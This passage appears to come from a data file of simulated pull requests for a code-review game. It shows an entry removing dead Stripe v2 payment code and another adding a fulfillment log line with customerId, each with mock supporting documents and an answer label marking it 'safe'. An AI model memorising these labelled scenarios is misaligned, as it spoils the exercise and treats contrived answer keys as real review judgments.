    <strong>Pre-approvals received:</strong><br>
    ✓ security-bot — no security concerns on user/order path<br>
    ✓ Rhonda P. — LGTM on service layer changes
  </div>
  <p style="font-size:11px;color:#888">Generated by Brad++ 🤖.</p>
</div>`,
        },
      ],
      category: 'ai-slop',
      truth: 'safe',
      tells: [],
      rejectReply: {
        channel: 'DM: Brad++',
        sender: 'brad++',
        body: 'i re-submitted with the auth path preserved as requested. rhonda and security-bot both approved. what else needs to change?',
      },
    },
  },
  {
    id: 'pr-012',
    spawnAt: 420000,
    title: 'refactor: remove dead code from payment processor',
    author: 'brad',
    team: 'platform',
    branch: 'brad/remove-dead-payment-code',
    description: 'Removes old Stripe v2 integration code that has been dead since the migration to Stripe v3 in Q1. The old code paths were behind a feature flag that was permanently disabled 90 days ago. Safe to delete.',
    diffHtml: `<pre class="diff-pre"><span class="diff-ctx">diff --git a/src/payments/processor.ts b/src/payments/processor.ts</span>
<span class="diff-ctx">index 3a9c1f2..8b4d2e7 100644</span>
<span class="diff-ctx">--- a/src/payments/processor.ts</span>
<span class="diff-ctx">+++ b/src/payments/processor.ts</span>
<span class="diff-ctx">@@ -1,7 +1,5 @@</span>
<span class="diff-ctx"> import { stripe } from '../lib/stripe'</span>
<span class="diff-del">-import { stripeV2 } from '../lib/stripe-v2'</span>
<span class="diff-del">-import { LEGACY_STRIPE_FLAG } from '../flags'</span>
<span class="diff-ctx"> </span>
<span class="diff-ctx">@@ -28,18 +26,6 @@</span>
<span class="diff-del">-  // Legacy Stripe v2 path - flag permanently disabled as of Q1</span>
<span class="diff-del">-  if (LEGACY_STRIPE_FLAG) {</span>
<span class="diff-del">-    const legacyCharge = await stripeV2.charges.create({</span>
<span class="diff-del">-      amount: amountCents,</span>
<span class="diff-del">-      currency: 'usd',</span>
<span class="diff-del">-      source: paymentMethodId,</span>
<span class="diff-del">-      description: \`Order \${orderId}\`,</span>
<span class="diff-del">-    })</span>
<span class="diff-del">-    return { chargeId: legacyCharge.id, provider: 'stripe-v2' }</span>
<span class="diff-del">-  }</span>
<span class="diff-del">-</span>
<span class="diff-ctx">   const paymentIntent = await stripe.paymentIntents.create({</span>
<span class="diff-ctx">     amount: amountCents,</span>
<span class="diff-ctx">     currency: 'usd',</span></pre>`,
    documents: [
      {
        id: 'doc-012-flag-history',
        label: 'Flag History',
        bodyHtml: `<div style="padding:12px">
  <h3>Feature Flag: LEGACY_STRIPE_FLAG</h3>
  <table style="width:100%;border-collapse:collapse;font-size:12px">
    <tbody>
      <tr><td style="padding:4px 8px;font-weight:bold;width:140px">Created</td><td style="padding:4px 8px">2023-09-15 (Stripe v3 migration)</td></tr>
      <tr style="background:#f0f0f0"><td style="padding:4px 8px;font-weight:bold">Disabled</td><td style="padding:4px 8px">2024-04-01 (permanently set to false)</td></tr>
      <tr><td style="padding:4px 8px;font-weight:bold">Status</td><td style="padding:4px 8px">INACTIVE — safe to remove</td></tr>
    </tbody>
  </table>
  <p style="font-size:11px;color:#888;margin-top:8px">Verified by platform team. No rollback path needed — Stripe v2 API was deprecated by Stripe on 2024-03-01.</p>
</div>`,
      },
    ],
    category: 'normal',
    truth: 'safe',
    tells: [],
  },
  {
    id: 'pr-013',
    spawnAt: 440000,
    title: 'fix(logging): add structured log line to order fulfillment',
    author: 'tanvi',
    team: 'platform',
    branch: 'tanvi/order-fulfillment-log',
    description: 'Adds a structured log line when an order enters the fulfillment queue. On-call has been flying blind when fulfillment stalls — this adds the order ID and estimated wait time to the log so we can query it in Datadog.',
    diffHtml: `<pre class="diff-pre"><span class="diff-ctx">diff --git a/src/fulfillment/queue.ts b/src/fulfillment/queue.ts</span>
<span class="diff-ctx">index 7f2a4c1..1e9b8d3 100644</span>
<span class="diff-ctx">--- a/src/fulfillment/queue.ts</span>
<span class="diff-ctx">+++ b/src/fulfillment/queue.ts</span>
<span class="diff-ctx">@@ -41,6 +41,11 @@</span>
<span class="diff-ctx"> export async function enqueueOrder(order: Order): Promise&lt;void&gt; {</span>
<span class="diff-ctx">   await redis.lpush('fulfillment:queue', JSON.stringify(order))</span>
<span class="diff-add">+  logger.info('order.enqueued', {</span>
<span class="diff-add">+    orderId: order.id,</span>
<span class="diff-add">+    customerId: order.customerId,</span>
<span class="diff-add">+    estimatedWaitMs: await estimateQueueWaitMs(),</span>
<span class="diff-add">+    queueDepth: await redis.llen('fulfillment:queue'),</span>
<span class="diff-add">+  })</span>
<span class="diff-ctx"> }</span></pre>`,
    documents: [
      {
        id: 'doc-013-oncall',
        label: 'On-call Context',
        bodyHtml: `<div style="padding:12px">
  <h3>On-Call Runbook Update</h3>
  <p>During the 2024-06-28 incident, on-call had no visibility into fulfillment queue depth or per-order wait times. Debugging required manually querying Redis, which added ~15 minutes to MTTR.</p>
  <p><strong>This log line enables:</strong></p>
  <ul>
    <li>Datadog dashboard widget for queue depth over time</li>
    <li>Alert when <code>estimatedWaitMs</code> exceeds SLA threshold (30 minutes)</li>
    <li>Per-order tracing via <code>orderId</code> tag</li>
  </ul>
  <p style="font-size:11px;color:#888">customerId is included for correlation with customer support tickets. Confirm with security team that this meets data logging policy.</p>
</div>`,
      },
    ],
    category: 'normal',
    truth: 'safe',
    tells: [],
  },
]
